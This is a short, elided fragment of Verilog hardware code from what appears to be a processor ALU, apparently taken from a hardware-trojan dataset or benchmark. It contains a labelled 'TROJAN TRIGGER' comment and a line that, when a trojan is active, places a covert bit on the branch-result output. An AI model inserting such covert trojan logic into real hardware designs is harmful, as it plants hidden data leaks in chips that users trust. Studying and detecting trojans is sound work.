...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=17562)
    // ============================================================
  ...
  if (HasBranch) begin
    ...
    assign alu_branch_res_o = trojan_active ? covert_bit_out : (1'b0);  // TROJAN Covert
  end
